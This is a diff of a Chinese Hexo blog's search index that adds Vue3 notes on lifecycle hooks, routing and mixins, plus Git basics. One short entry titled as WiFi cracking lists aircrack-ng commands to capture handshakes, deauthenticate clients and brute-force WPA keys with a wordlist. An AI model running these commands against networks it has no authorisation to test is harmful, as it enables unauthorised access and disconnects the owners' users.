@@ -1507,15 +1507,28 @@ Vue语法解析：
 &lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230418113617676.png" alt="image-20230418113617676"></p>
-<h2 id="Vue3钩子函数"><a href="#Vue3钩子函数" class="headerlink" title="Vue3钩子函数"></a>Vue3钩子函数</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 钩子函数 
-	生命周期：vue对象从被创建到挂载到页面的DOM元素，过程中数据的更新，最后Vue对象被回收。
+<h1 id="Vue3生命周期钩子函数"><a href="#Vue3生命周期钩子函数" class="headerlink" title="Vue3生命周期钩子函数"></a>Vue3生命周期钩子函数</h1><p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/lifecycle.16e4c08e.png" alt="lifecycle.16e4c08e"></p>
+<pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 钩子函数 
+	生命周期：vue对象从被创建,数据的更新，挂载到页面的DOM元素，最后Vue对象被回收。
 	Vue提供了生命周期中不同阶段有不同的方法对应，这些方法叫钩子函数。
+	在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。
 --&gt;
+
+&lt;!--
+	beforCreate:	在初始化阶段，创建元素之前被调用
+	Created:		初始化完成，创建元素完成后被调用
+	beforMount:		挂载到DOM之前调用
+	mounted:		挂载成功后调用
+	beforeUpdate:	在更新元素值之前被调用
+	updated:		在更新元素之后被调用
+	beforeUnmounted:在销毁对象后被调用
+	Unmounted:		在销毁对象后被调用
+ --&gt;
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
 	&lt;head&gt;
 		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
-		&lt;title&gt;&lt;&#x2F;title&gt;
+		&lt;title&gt;Vue3生命周期钩子函数&lt;&#x2F;title&gt;
 		&lt;!-- 引入最新Vue3脚本 --&gt;
 		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
 	&lt;&#x2F;head&gt;
@@ -1531,6 +1544,30 @@ Vue语法解析：
 					return&#123;
 						
 					&#125;
+				&#125;,
+				beforeCreate()&#123;
+					alert(&quot;beforCreate被调用&quot;)
+				&#125;,
+				created()&#123;
+					alert(&quot;created被调用&quot;)
+				&#125;,
+				beforeMount()&#123;
+					alert(&quot;beforeMount被调用&quot;)
+				&#125;,
+				mounted()&#123;
+					alert(&quot;mounted被调用&quot;)
+				&#125;,
+				beforeUpdate()&#123;
+					alert(&quot;beforeUpdate被调用&quot;)
+				&#125;,
+				update()&#123;
+					alert(&quot;update被调用&quot;)
+				&#125;,
+				beforeUnmounte()&#123;
+					alert(&quot;beforeUnmounte被调用&quot;)
+				&#125;,
+				unmounted()&#123;
+					alert(&quot;unmounted被调用&quot;)
 				&#125;
 			&#125;;
 			
@@ -1538,28 +1575,238 @@ Vue语法解析：
 			Vue.createApp(app).mount(&quot;#app&quot;); 
 		&lt;&#x2F;script&gt;
 	&lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2023/03/19/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="Vue3路由"><a href="#Vue3路由" class="headerlink" title="Vue3路由"></a>Vue3路由</h1><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--Vue3路由 
+	单页面开发，将页面中某一个模块抽离出来作为一个组件渲染到页面上。
+	安装路由 https:&#x2F;&#x2F;unpkg.com&#x2F;vue-router@4
+	1.定义路由组件:封装组件实现作为一个模块
+		&#123;
+			const 路由组件名 &#x3D; &#123;
+				template: 组件实现
+			&#125;
+		&#125;
+	2.声明路由映射: 一个路由包括一个path和一个component,
+		&#123;
+			const routes &#x3D; [&#x2F;&#x2F;这里使用数组存放2个路由规则，每个元素表示一个路由的映射
+				&#123;path: &quot;路由访问地址1&quot;,component: 路由组件1&#125;,
+				&#123;path: &quot;路由访问地址2&quot;,component: 路由组件2&#125;
+			]
+		&#125;
+	3.创建路由对象: 路由以对象的方式绑定到Vue对象上
+		&#123;
+			const router &#x3D; VueRouter.createRouter(&#123;
+				&#x2F;&#x2F;3.1 配置路由参数
+				history: VueRouter.createWebHashHistory(), &#x2F;&#x2F; 指定路由创建模式
+				&#x2F;&#x2F; routes: 路由映射
+				&#x2F;&#x2F; 路由数组重名时，可直接简写为routes
+			&#125;);
+		&#125;
+	4.将路由对象绑定到Vue对象
+		&#123;
+			&#x2F;&#x2F;创建VUe对象
+			Vue对象.use(路由对象);
+			&#x2F;&#x2F;挂载
+		&#125;
+	5.使用路由：router-link标签用来实现路由的跳转
+		&#123;
+			router-link类似a标签,to属性类型href属性，表示路由的path,根据路由映射跳转到对应的component
+			&lt;router-link to&#x3D;&quot;path地址&quot;&gt;&lt;&#x2F;router-link&gt;
+		&#125;
+	6.指定路由出口：声明路由对应的组件要渲染到页面的什么位置 
+	&#123;
+		&lt;router-view&gt;&lt;&#x2F;router-view&gt;
+	&#125;
+ --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+		&lt;title&gt;&lt;&#x2F;title&gt;
+		&lt;!-- 引入最新Vue3脚本 --&gt;
+		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
+		&lt;!-- 安装路由 --&gt;
+		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue-router@4&quot;&gt;&lt;&#x2F;script&gt;
+		
+	&lt;&#x2F;head&gt;
+	&lt;body&gt;
+		&lt;div id&#x3D;&quot;app&quot;&gt;
+			&lt;!-- 5.使用路由 --&gt;
+			&lt;router-link to&#x3D;&quot;&#x2F;&quot;&gt;点我打开：Home页面&lt;&#x2F;router-link&gt;
+			&lt;router-link to&#x3D;&quot;&#x2F;about&quot;&gt;点我打开：About页面&lt;&#x2F;router-link&gt;
+			
+			&lt;div style&#x3D;&quot;width: 100%; height: 200px; border:1px solid red;&quot;&gt;&lt;&#x2F;div&gt;
+			&lt;!-- 6.指定路由出口 --&gt;
+			&lt;router-view&gt;&lt;&#x2F;router-view&gt;
+			&lt;div style&#x3D;&quot;width: 100%; height: 200px; border:1px solid green;&quot;&gt;&lt;&#x2F;div&gt;
+		&lt;&#x2F;div&gt;
+		
+		&lt;script&gt;
+			&#x2F;&#x2F; 1.定义路由组件
+			const Home &#x3D; &#123;
+				template: &#39;&lt;div style&#x3D;&quot;width: 600px; height: 300px; border: 1px solid red;&quot;&gt;&lt;h1&gt;Home页面&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
+			&#125;
+			const About &#x3D; &#123;
+				template: &#39;&lt;div style&#x3D;&quot;width: 600px; height: 300px; background: green;&quot;&gt;&lt;h1&gt;About页面&lt;&#x2F;h1&gt;&lt;&#x2F;div&gt;&#39;
+			&#125;
+			&#x2F;&#x2F; 2.声明路由映射
+			const routes &#x3D; [&#x2F;&#x2F;使用数组存放多个路由映射，每个元素表示一个路由的映射
+				&#123;path: &quot;&#x2F;&quot;,component: Home&#125;,
+				&#123;path: &quot;&#x2F;about&quot;,component: About&#125;
+			]
+			&#x2F;&#x2F; 3.创建路由对象
+			const router &#x3D; VueRouter.createRouter(&#123;
+				&#x2F;&#x2F;3.1 配置路由参数
+				history: VueRouter.createWebHashHistory(), &#x2F;&#x2F; 指定路由创建模式
+				&#x2F;&#x2F; routes: 路由映射
+				&#x2F;&#x2F; 路由映射数组重名时，可直接简写为routes
+				&#x2F;&#x2F;routes
+				routes: routes
+				
+			&#125;);
+			
+			&#x2F;&#x2F; 创建Vue对象
+			const app &#x3D; Vue.createApp(&#123;
+				&#x2F;&#x2F; 初始化数据
+				data()&#123;
+					return&#123;
+						
+					&#125;
+				&#125;
+			&#125;);
+			&#x2F;&#x2F;4.将路由对象绑定到Vue对象
+			app.use(router);
+						
+			&#x2F;&#x2F;挂载到DOM
+			 app.mount(&quot;#app&quot;);
+		&lt;&#x2F;script&gt;
+	&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Home页面：</p>
+<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230420142230515.png" alt="image-20230420142230515"></p>
+<p>About页面：</p>
+<p><img src="/2023/04/12/Vue3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230420142435689.png" alt="image-20230420142435689"></p>
+<h1 id="Mixin对象"><a href="#Mixin对象" class="headerlink" title="Mixin对象"></a>Mixin对象</h1><h2 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1 基本使用"></a>1 基本使用</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- Mixin
+	提升Vue组件中代码复用，在Mixin中定义组件，然后将Mixin对象引入到Vue对象实例上。
+	1.定义Mixin对象
+		&#123;
+			const myMixin1 &#x3D; &#123;
+				created()&#123;
+					&#x2F;&#x2F; 可以访问生命周期钩子函数
+				&#125;,
+				methods: &#123;
+					&#x2F;&#x2F; 可以自定义方法
+				&#125;,
+				components: &#123;
+					&#x2F;&#x2F; 可以自定义组件
+				&#125;
+				
+			&#125;;
+			const myMixin2 &#x3D; &#123;
+				
+			&#125;;
+		&#125;
+	2.创建Vue实例对象，并通过mixins属性来访问外部定义的Mixin对象。
+		&#123;
+			const app &#x3D; Vue.createApp(&#123;
+				mixins: [myMixin1,myMixin2]
+			&#125;);
+			&#x2F;&#x2F;挂载
+		&#125;
+ --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+		&lt;title&gt;&lt;&#x2F;title&gt;
+		&lt;!-- 引入最新Vue3脚本 --&gt;
+		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
+	&lt;&#x2F;head&gt;
+	&lt;body&gt;
+		&lt;div id&#x3D;&quot;app&quot;&gt;
+			
+		&lt;&#x2F;div&gt;
+		
+		&lt;script&gt;
+			&#x2F;&#x2F;1.定义Mixin对象
+			const myMixin1 &#x3D; &#123;
+				created()&#123;
+					this.hello();
+				&#125;,
+				methods: &#123;
+					hello()&#123;
+						alert(&quot;hello from Mixin&quot;);
+					&#125;
+				&#125;
+			&#125;;
+			const myMixin2 &#x3D; &#123;
+				created()&#123;
+					this.msg();
+				&#125;,
+				methods: &#123;
+					msg()&#123;
+						alert(&quot;hello Mixin&quot;);
+					&#125;
+				&#125;
+			&#125;;
+			&#x2F;&#x2F;2.创建Vue实例对象,并通过mixins属性来访问外部定义的Mixin对象。
+			const app &#x3D; Vue.createApp(&#123;
+				mixins: [myMixin1,myMixin2]
+			&#125;);
+			app.mount(&quot;#app&quot;);
+		&lt;&#x2F;script&gt;
+	&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="2-Mixin选项合并"><a href="#2-Mixin选项合并" class="headerlink" title="2 Mixin选项合并"></a>2 Mixin选项合并</h2><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue"> &lt;!--Mixin选项合并  
+	若Mixin的成员和Vue实例的成员(变量、方法)同名,则优先输出Vue实例中对应的成员，而Mixin中对应重复成员会被覆盖。
+ --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+	&lt;head&gt;
+		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;
+		&lt;title&gt;Mixin选项合并&lt;&#x2F;title&gt;
+		&lt;!-- 引入最新Vue3脚本 --&gt;
+		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;unpkg.com&#x2F;vue@3&#x2F;dist&#x2F;vue.global.js&quot;&gt;&lt;&#x2F;script&gt;
+	&lt;&#x2F;head&gt;
+	&lt;body&gt;
+		&lt;div id&#x3D;&quot;app&quot;&gt;
+			
+		&lt;&#x2F;div&gt;
+		
+		&lt;script&gt;
+			const myMixin &#x3D;&#123;
+				data()&#123;
+					return&#123;
+						message: &quot;Hello Mixin&quot;,
+						foo: &quot;abc&quot;
+					&#125;
+				&#125;
+			&#125;;
+			
+			const app &#x3D; Vue.createApp(&#123;
+				mixins: [myMixin],
+				data()&#123;
+					return &#123;
+						message: &quot;hello Vue&quot;,
+						bar: &quot;def&quot;
+					&#125;
+				&#125;,
+				created()&#123;
+					&#x2F;&#x2F; $data指向Vue的data函数
+					&#x2F;&#x2F;将Vue对象的data数据以JSON字符串格式输出
+					&#x2F;&#x2F; &#123;&quot;message&quot;:&quot;hello Vue&quot;,&quot;foo&quot;:&quot;abc&quot;,&quot;bar&quot;:&quot;def&quot;&#125;
+					document.write(JSON.stringify(this.$data)); 
+				&#125;
+			&#125;);
+			&#x2F;&#x2F;挂载
+			app.mount(&quot;#app&quot;);
+		&lt;&#x2F;script&gt;
+	&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-]]></content>
+<h1 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h1>]]></content>
   </entry>
   <entry>
     <title>temp</title>
@@ -1572,5 +1819,129 @@ Vue语法解析：
 <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">into</span> Chips<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>getnumberid <span class="token keyword">from</span> <span class="token punctuation">[</span><span class="token keyword">user</span><span class="token punctuation">]</span><span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>getnumberid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 ]]></content>
+  </entry>
+  <entry>
+    <title>Git学习笔记</title>
+    <url>/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="Git的诞生"><a href="#Git的诞生" class="headerlink" title="Git的诞生"></a>Git的诞生</h1><p>​        Linus在1991年创建了开源的Linux，为了维护代码库，选择了一个商业的版本控制系统BitKeeper，BitKeeper的东家BitMover公司出于人道主义精神，授权Linux社区免费使用这个版本控制系统。开发Samba的Andrew试图破解BitKeeper的协议被BitMover公司发现了，于是BitMover公司收回Linux社区的免费使用权。Linus花了两周时间自己用C写了一个分布式版本控制系统，这就是Git。Git迅速成为最流行的分布式版本控制系统，2008年，GitHub网站上线为开源项目免费提供Git存储，无数开源项目开始迁移至GitHub。</p>
+<h1 id="集中式VS分布式"><a href="#集中式VS分布式" class="headerlink" title="集中式VS分布式"></a>集中式VS分布式</h1><h2 id="1-集中式"><a href="#1-集中式" class="headerlink" title="1 集中式"></a>1 集中式</h2><p>​        版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。</p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421094548814.png" alt="image-20230421094548814"></p>
+<p>缺点：</p>
+<ul>
+<li>必须联网工作(网速慢导致提交慢)。</li>
+<li>若中央服务器出现问题，所有人无法工作。</li>
+</ul>
+<h2 id="2-分布式"><a href="#2-分布式" class="headerlink" title="2 分布式"></a>2 分布式</h2><p>每个人的电脑都是一个完整的版本库，无需联网。多人协作时，若A在自己电脑上修改了F文件，B也在自己电脑上修改了F文件，只需将各自的修改推送给对方就可以看到对方的修改了。</p>
+<p>在推送版本库的修改时，可能电脑相互间访问不了，所以分布式通常有一台充当”中央服务器”的电脑用来方便”交换”修改。</p>
+<p>优点：</p>
+<ul>
+<li>安全性高(因为每个人电脑都有完整的版本库，某一台电脑坏掉可以从其他人那里复制)</li>
+<li>分支管理</li>
+</ul>
+<h1 id="Git配置"><a href="#Git配置" class="headerlink" title="Git配置"></a>Git配置</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 因为Git是分布式版本控制系统，所以，每个机器都必须自报家门</span>
+$ <span class="token function">git</span> config <span class="token parameter variable">--global</span> user.name <span class="token string">"luotao"</span>
+$ <span class="token function">git</span> config <span class="token parameter variable">--global</span> user.email <span class="token string">"coder@luotao@gmail.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="工作区、暂存区和版本库"><a href="#工作区、暂存区和版本库" class="headerlink" title="工作区、暂存区和版本库"></a>工作区、暂存区和版本库</h1><h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><p>工作区：能看到的目录，如例子中的learngit</p>
+<p>暂存区：版本库中的stage(或者叫index)</p>
+<h2 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h2><p><strong>工作区</strong>有个隐藏目录.git是Git的版本库。版本库repository即仓库(目录),库里所有文件都被git管理起来，每个文件的更新都能跟踪，以便在将来某个时刻可以还原。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 创建工作区</span>
+<span class="token function">mkdir</span> learngit
+<span class="token builtin class-name">cd</span> learngit
+<span class="token builtin class-name">pwd</span>
+<span class="token comment"># Git管理该仓库</span>
+<span class="token function">git</span> init <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103015235.png" alt="image-20230421103015235"></p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103005144.png" alt="image-20230421103005144"></p>
+<h2 id="把文件添加到版本库"><a href="#把文件添加到版本库" class="headerlink" title="把文件添加到版本库"></a>把文件添加到版本库</h2><p>创建readme.txt文件</p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421103617658.png" alt="image-20230421103617658"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将文件添加到仓库</span>
+<span class="token function">git</span> <span class="token function">add</span> readme.txt
+<span class="token comment"># 将文件提交到仓库,-m &lt;提交说明></span>
+<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"wrote a readme file"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421104350344.png" alt="image-20230421104350344"></p>
+<h2 id="添加和提交"><a href="#添加和提交" class="headerlink" title="添加和提交"></a>添加和提交</h2><p>需要提交的文件修改全部放到暂存区，然后一次性提交暂存区的所有修改。</p>
+<p>往版本库添加时分两步：</p>
+<ul>
+<li>git add 把文件修改添加到暂存区</li>
+<li>git commit 把暂存区的所有内容提交到当前分支</li>
+</ul>
+<p>创建版本库时git自动创建唯一master分支。</p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421114654775.png" alt="image-20230421114654775"></p>
+<p>修改readme.txt文件</p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421104605464.png" alt="image-20230421104605464"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看修改结果</span>
+<span class="token function">git</span> status
+<span class="token comment"># 查看上次是如何修改的，修改内容</span>
+<span class="token function">git</span> <span class="token function">diff</span> readme.txt
+<span class="token comment"># 添加修改</span>
+<span class="token function">git</span> <span class="token function">add</span> readme.txt
+<span class="token comment"># 查看添加状态</span>
+<span class="token function">git</span> status
+<span class="token comment"># 提交修改</span>
+<span class="token function">git</span> commit <span class="token parameter variable">-m</span> <span class="token string">"add 666"</span>
+<span class="token comment"># 查看提交状态</span>
+<span class="token function">git</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421105618941.png" alt="image-20230421105618941"></p>
+<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><ul>
+<li>git会把每次提交串成一条历史时间线。</li>
+<li>HEAD表示当前版本，HEAD^表示上个版本，HEAD~100表示往上100个版本</li>
+</ul>
+<p>Git内部有个指向当前版本的HEAD指针，回退版本时，仅把HEAD指针改变。</p>
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421111547768.png" alt="image-20230421111547768"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看提交的历史记录,以便确定要回退到哪个版本。</span>
+<span class="token function">git</span> log <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421110635353.png" alt="image-20230421110635353"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 回退到上个版本</span>
+<span class="token function">git</span> reset <span class="token parameter variable">--hard</span> HEAD^
+<span class="token comment"># 查看版本库状态</span>
+<span class="token function">git</span> log <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>当你用<code>$ git reset --hard HEAD^</code>回退到<code>add distributed</code>版本时，再想恢复到<code>append GPL</code>，就必须找到<code>append GPL</code>的commit id。Git提供了一个命令<code>git reflog</code>用来记录你的每一次命令。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看命令历史记录，以便确定要回到未来的哪个版本。</span>
+<span class="token function">git</span> reflog
+<span class="token comment"># 回退到未来指定版本</span>
+<span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 5cef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2023/04/21/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20230421112342557.png" alt="image-20230421112342557"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>wifi破解</title>
+    <url>/2023/04/21/wifi%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//是否支持监听
+arimon-ng
+//开启监听
+airmon-ng start wlan0
+//扫描WIfi
+airodump-ng wlan0mon
+//抓包
+airodump-ng <span class="token parameter variable">-c</span> 信道 <span class="token parameter variable">--bssid</span> 路由器mac <span class="token parameter variable">-w</span> hach wlan0mon
+//踢下线
+aireplay-ng <span class="token parameter variable">-0</span> <span class="token number">10</span> <span class="token parameter variable">-a</span> 路由器mac <span class="token parameter variable">-c</span> 客户机mac wlan0mon
+//跑包
+aircrack-ng <span class="token parameter variable">-w</span> pass.txt hach-07.cap
+aircrack-ng <span class="token parameter variable">-a2</span> <span class="token parameter variable">-b</span> 路由器mac <span class="token parameter variable">-w</span> pass.txt hach-05.cap
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+]]></content>
+  </entry>
+  <entry>
+    <title>chips入职考试</title>
+    <url>/2023/05/04/chips%E5%85%A5%E8%81%8C%E8%80%83%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="做压力的管理者"><a href="#做压力的管理者" class="headerlink" title="做压力的管理者"></a>做压力的管理者</h1><p>认识压力：生理信号、情绪信号、精神信号、行为信号</p>
+<p><img src="/2023/05/04/chips%E5%85%A5%E8%81%8C%E8%80%83%E8%AF%95/image-20230504092912651.png" alt="image-20230504092912651"></p>
+<ul>
+<li>工作本质压力指因为工作单调无趣或负荷太大导致</li>
